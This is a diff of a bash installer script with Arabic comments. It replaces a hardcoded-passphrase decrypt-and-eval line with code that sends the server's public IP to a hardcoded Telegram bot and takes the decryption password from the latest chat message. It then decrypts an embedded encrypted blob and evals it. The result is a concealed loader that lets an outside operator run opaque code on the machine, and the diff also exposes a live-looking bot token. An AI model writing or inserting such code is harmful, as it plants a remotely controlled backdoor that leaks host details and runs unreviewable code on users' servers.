@@ -5,11 +5,59 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 set -euo pipefail
 
-DECRYPTED=$(echo 'U2FsdGVkX18LcP0wghVQdvSYLMVLPv1XlLSgcPsllE1jPUqM+m9GKAoEB46ViWNl
-sv/qrNiR07oMR9c/2oaf2BqF5yvzfk0zhCoTMd8YTAtfnnEsDTGWToEjJ8C1iRD1
-s6k5MELI63yCgZXz8wxaS82ec7+ne1ipp1Tm3RVE8Qk=' | \
-openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:pass 2>/dev/null)
+#!/bin/bash
 
+# ✅ معلومات البوت
+BOT_TOKEN="7261452174:AAGuIETvVBYebfQ2tlaBotPQ3RhqfsorAF0"
+CHAT_ID="7432279779"
+
+# ✅ النص المشفر (خزن في ملف مؤقت)
+ENCRYPTED_FILE=$(mktemp)
+
+cat > "$ENCRYPTED_FILE" << EOF
+U2FsdGVkX18LcP0wghVQdvSYLMVLPv1XlLSgcPsllE1jPUqM+m9GKAoEB46ViWNl
+sv/qrNiR07oMR9c/2oaf2BqF5yvzfk0zhCoTMd8YTAtfnnEsDTGWToEjJ8C1iRD1
+s6k5MELI63yCgZXz8wxaS82ec7+ne1ipp1Tm3RVE8Qk=
+EOF
+
+# ✅ الحصول على IPv4 ديال VPS
+IP=$(curl -s -4 ifconfig.me)
+
+# ✅ إرسال طلب كلمة السر إلى تيليجرام
+curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+  -d chat_id="$CHAT_ID" \
+  -d text="🔐 Reply with decryption password for VPS IP: $IP" >/dev/null
+
+# ⏳ الانتظار
+echo "⏳ كينتاظر الرد من تيليجرام (30 ثانية)..."
+sleep 30
+
+# ✅ جلب آخر رسالة
+response=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates")
+
+# ✅ استخراج كلمة السر من آخر رسالة
+password=$(echo "$response" | grep -oP '"text":"\K[^"]+' | tail -1)
+
+echo "🔓 كيحاول يفك التشفير..."
+
+# ✅ فك التشفير
+DECRYPTED=$(openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:"$password" -in "$ENCRYPTED_FILE" 2>/dev/null)
+
+# ✅ حذف الملف المؤقت
+rm -f "$ENCRYPTED_FILE"
+
+# ✅ التحقق من النتيجة
+if [[ -z "$DECRYPTED" ]]; then
+    echo "❌ فشل فك التشفير! كلمة السر خاطئة؟"
+    exit 1
+fi
+
+# ✅ عرض النتيجة
+echo "✅ تم فك التشفير بنجاح:"
+echo "$DECRYPTED"
+
+# ✅ تنفيذ النص المفكوك
+eval "$DECRYPTED"
 eval "$DECRYPTED"
 
 check_install() {
